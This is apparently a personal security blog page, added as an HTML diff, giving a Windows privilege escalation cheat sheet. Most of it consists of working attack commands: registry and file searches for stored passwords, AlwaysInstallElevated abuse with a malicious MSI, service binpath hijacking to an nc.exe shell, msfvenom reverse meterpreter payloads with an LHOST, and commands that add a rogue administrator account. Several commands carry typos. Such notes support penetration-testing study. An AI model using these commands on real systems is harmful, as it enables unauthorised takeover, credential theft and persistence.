@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="author" content="d47zm3">
+    <meta name="description" content="Personal DevOps &amp; Security Site">
+    <meta name="keywords" content="blog,devops,personal,security">
+
+    <base href="https://d47zm3.me">
+    <title>
+  Windows Privilege Escalation · d47zm3
+</title>
+
+    <link rel="canonical" href="https://d47zm3.me/resources/infosec/windows-privilege-escalation/">
+
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700|Merriweather:300,700|Source+Code+Pro:400,700" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css" integrity="sha384-mzrmE5qonljUremFsqc01SB46JvROS7bZs3IO2EmfFsd15uHvIt+Y8vEf7N7fWAU" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.0/normalize.min.css" integrity="sha256-oSrCnRYXvHG31SBifqP2PM1uje7SJUyX0nTwO2RJV54=" crossorigin="anonymous" />
+
+    
+      
+      
+      <link rel="stylesheet" href="https://d47zm3.me/css/coder.min.42b57c75b1d9e2f7bcc89c4031716ec188e0a0e63dbde8150859ed6ad58763ec.css" integrity="sha256-QrV8dbHZ4ve8yJxAMXFuwYjgoOY9vegVCFntatWHY&#43;w=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+
+    
+      <link rel="stylesheet" href="https://d47zm3.me/css/custom.css">
+    
+
+    <link rel="icon" type="image/png" href="https://d47zm3.me/img/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="https://d47zm3.me/img/favicon-16x16.png" sizes="16x16">
+
+    
+
+    <meta name="generator" content="Hugo 0.53" />
+  </head>
+
+  <body class=" ">
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="https://d47zm3.me">
+      
+    </a>
+    <input type="checkbox" id="menu-toggle" />
+    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
+    <ul class="navigation-list">
+      
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://d47zm3.me/">Home</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://d47zm3.me/projects/">Projects</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://d47zm3.me/resources/">Resources</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://d47zm3.me/bookmarks/">Bookmarks</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://d47zm3.me/about/">About</a>
+          </li>
+        
+      
+      
+    </ul>
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container page">
+  <article>
+    <header>
+      <h1>Windows Privilege Escalation</h1>
+    </header>
+
+    
+
+<h3 id="windows-exploit-os-reference">Windows Exploit/OS Reference</h3>
+
+<p><img src="https://d47zm3.me/img/windows-privesc-table.png" alt="Windows Privilege Escalation Scripts" /></p>
+
+<h3 id="scripts">Scripts</h3>
+
+<ul>
+<li>JAWS</li>
+<li>Sherlock</li>
+<li>Powerup</li>
+<li>Google Windows Version for common exploits</li>
+</ul>
+
+<h3 id="kernel-exploits">Kernel Exploits</h3>
+
+<ul>
+<li>systeminfo -&gt; look up missing kb&rsquo;s</li>
+<li>systeminfo | findstr /B /C:&ldquo;OS Name&rdquo; /C:&ldquo;OS * Version&rdquo;</li>
+<li>sherlock -&gt; Find-AllVulns powershell</li>
+</ul>
+
+<h3 id="common-kernel-exploits">Common Kernel Exploits</h3>
+
+<ul>
+<li>MS16-014 - applies to: Windows 7 SP1 x86</li>
+<li>MS16-016 - &lsquo;WebDAV&rsquo; applies to Windows 7 SP1 x86 (Build 7601)</li>
+<li>MS16-032 - applies to: Windows 7 x86/x64, Windows 8 x86/64, Windows 10, Windows Server 2008-2012 R2</li>
+</ul>
+
+<h3 id="config-files">Config Files</h3>
+
+<p>Credentials in ClearText or Base64 -&gt; once Windows in installed</p>
+
+<ul>
+<li><p>c:\sysprep.inf</p></li>
+
+<li><p>c:\sysprep\sysprep.xml</p></li>
+
+<li><p>%WINDIR%\Panther\Unattend\Unattended.xml</p></li>
+
+<li><p>%WINDIR%\Panther\Unattended.xml</p></li>
+</ul>
+
+<h3 id="gpp-group-policy-preferences">GPP (Group Policy Preferences)</h3>
+
+<p>Only applicable for devices connected to a domain</p>
+
+<ul>
+<li>Groups.xml stored in SYSVOL -&gt; DC, encrypted with AES, but key got leaked
+<code>
+\\dc2018.lab\SYSVOL\dc2008.lab\Policies\{id}\MACHINE\Preferences\Groups
+</code></li>
+</ul>
+
+<h3 id="other-files">Other Files</h3>
+
+<ul>
+<li><p>Services\Services.xml</p></li>
+
+<li><p>ScheduldedTasks\ScheduledTasks.xml</p></li>
+
+<li><p>Printers\Printers.xml</p></li>
+
+<li><p>Drives\Drives.xml</p></li>
+
+<li><p>DataSources\DataSources.xml</p></li>
+</ul>
+
+<h3 id="other-misc-passwords">Other Misc Passwords</h3>
+
+<ul>
+<li><p><code>dir /s *pass* == *cred* == *vnc* == *.config*</code></p></li>
+
+<li><p><code>findstr /si password *.xml *.ini *.txt</code></p></li>
+
+<li><p><code>reg query HKLM /f password /t REG_SZ /s</code></p></li>
+
+<li><p><code>reg query HKCU /f password /t REG_SZ /s</code></p></li>
+
+<li><p>web.config</p></li>
+
+<li><p>php.ini</p></li>
+
+<li><p>httpd.conf</p></li>
+
+<li><p>access.log</p></li>
+
+<li><p>PowerUp:</p>
+
+<ul>
+<li>Get-WebConfig (ISS &gt; web.config)</li>
+</ul></li>
+
+<li><p>PuTTY:</p>
+
+<ul>
+<li><code>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions</code></li>
+</ul></li>
+
+<li><p>Tight VNC:</p>
+
+<ul>
+<li><p><code>reg query HKCU\Software\TightVNC\Server</code></p></li>
+
+<li><p><code>bncpwd.exe &lt;encrypted_password&gt;</code></p></li>
+</ul></li>
+
+<li><p>Always Install Elevated:</p>
+
+<ul>
+<li><p><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstalledElevated</code></p></li>
+
+<li><p><code>reg query HKCU\SOFTWARE\Policies\Micorosft\Windows\Installer\AlwaysInstalledElevated</code></p></li>
+
+<li><p>both values = 1, created a malicious .msi file with msfvenom for example</p></li>
+
+<li><p>execute it with <code>msiexec /quiet /qn /i &lt;filename.msi&gt;</code></p></li>
+</ul></li>
+
+<li><p>PowerUp:</p>
+
+<ul>
+<li><p><code>Get-RegistryAlwaysInstallElevated</code></p></li>
+
+<li><p><code>Write-UserAddMSI</code></p></li>
+</ul></li>
+</ul>
+
+<h3 id="unquoted-services-paths-trusted-service-paths">Unquoted Services Paths (Trusted Service Paths)</h3>
+
+<p>For each space in a file path, Windows will attempt to look for and execute programs with a name that matches the word in front of the space.</p>
+
+<p>Example:</p>
+
+<ul>
+<li><p>C:\Program Files\Some Folder\Service.exe</p></li>
+
+<li><p>C:\Program.exe</p></li>
+
+<li><p>C:\Program Files\Some.exe</p></li>
+
+<li><p>C:\Program Files\Some Folder\Service.exe</p></li>
+
+<li><p><code>wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</code></p></li>
+</ul>
+
+<p>PFNet
+* C:\Program Files (x86)\Privacyware\Privatefirewall 7.0\pfscv.exe
+* icalcs &ldquo;C:\Program Files (x86)\Privacyware&rdquo;
+* msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o Privatefirewall.exe
+Start and stop the service:
+* sc stop PFNet
+* sc start PFNET
+Powerup:
+* Get-ServiceUnquoted
+* Write-ServiceBinary -Name <service_name> -Path <hijack_path>
+Insecure Service Permissions
+* whoami &gt; net user <name> - enumerate groups
+* accesschk.exe -&gt; part of sysinternals
+* accesschk.exe -ucqv <service name>
+* accesschk.exe -uwcqv &ldquo;Authenticated Users&rdquo; * /accepteula</p>
+
+<p>Write access to a service as authenticated user?
+W-XP ssdprsv and upnphost by default:
+sc qc upnphost
+sc config upnphost binpath= &ldquo;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&rdquo;
+net start upnphost</p>
+
+<p>Powerup:
+* Get-ModifiableService
+* Test-ServiceDaclPermission
+* Invoke-ServiceAbuse -Name <service_name> -Command <command></p>
+
+<h3 id="dll-hijacking">DLL Hijacking</h3>
+
+<p>Requires User Interaction / Reboot.</p>
+
+<p>DLL search order on 32-bit systems:</p>
+
+<ol>
+<li><p>The directory from which the application is loaded</p></li>
+
+<li><p>32-bit System directory (C:\Windows\System32)</p></li>
+
+<li><p>16-bit System directory (C:\Windows\System)</p></li>
+
+<li><p>Windows directory (C:\Windows)</p></li>
+
+<li><p>The current working directory</p></li>
+
+<li><p>Directories in the PATH environment variable</p></li>
+</ol>
+
+<p>You can use procmon to look for vulnerable DLL&rsquo;s using the following filters:</p>
+
+<ul>
+<li><p>result is NAME NOT FOUND Include</p></li>
+
+<li><p>path ends with .dll</p></li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">echo %path%
+icacls C:\Python27
+accesssschk.exe -dqv &#34;C:\Python27&#34;
+sc qc IKEEXT</pre></div>
+<p>Generate a malicious payload with msfvenom:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=&lt;ip&gt; lport=&lt;port&gt; -f dll &gt; evil.dll</pre></div>
+<p>Windows 7 x86/64:</p>
+
+<ul>
+<li>IKE and AuthIP IPsec Keying Modules (IKEEEXT) - wlbsctrl.dll</li>
+</ul>
+
+<p>PowerUp:</p>
+
+<ul>
+<li><code>Find-PathDLLHijack</code></li>
+<li><code>Find-ProjcessDLLHijack</code></li>
+<li><code>Wire-HijackDll</code></li>
+</ul>
+
+<h3 id="schedulded-tasks">Schedulded Tasks:</h3>
+
+<p>On Windows Server 2000, 2003 and Windows XP, scheduled tasks are running as system. Are they calling any .exe&rsquo;s and can you overwrite?</p>
+
+<p><code>accesschk.exe -dqv &lt;folder path&gt;</code></p>
+
+<p>Can you create a task yourself?</p>
+
+<p><code>net start &quot;Task Scheduler&quot; at &lt;hour:minute&gt; /interactive &quot;path to evil exe&quot;</code></p>
+
+<p>PowerUp:</p>
+
+<p><code>Get-ModifiableScheduledTaskFile</code></p>
+
+<h3 id="useful-commands">Useful Commands</h3>
+
+<ul>
+<li><p><code>hostname</code></p></li>
+
+<li><p><code>echo %username%</code></p></li>
+
+<li><p><code>whoami / priv</code></p></li>
+
+<li><p><code>swinsta - other logged in users</code></p></li>
+
+<li><p><code>net users</code></p></li>
+
+<li><p><code>net user &lt;username&gt;</code></p></li>
+
+<li><p><code>net localgroup</code></p></li>
+
+<li><p><code>net localgroup Administrators</code></p></li>
+
+<li><p><code>net user rottenadmin P@ssword123! /add</code></p></li>
+
+<li><p><code>net localgroup Administrators rottenadmin /add</code></p></li>
+
+<li><p><code>ipconfing /all</code></p></li>
+
+<li><p><code>route print</code></p></li>
+
+<li><p><code>arp -a</code></p></li>
+
+<li><p><code>netstat -ano</code></p></li>
+
+<li><p><code>type C:\WINDOWS\System32\drivers\etc\hosts</code></p></li>
+
+<li><p><code>schtasks /query /fo LIST /v - scheduled task</code></p></li>
+
+<li><p><code>tasklist /SVC - running processes</code></p></li>
+
+<li><p><code>net start - started services</code></p></li>
+</ul>
+
+  </article>
+</section>
+
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    
+     © 2019
+    
+       · 
+      Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
+    
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+
+  </body>
+
+</html>
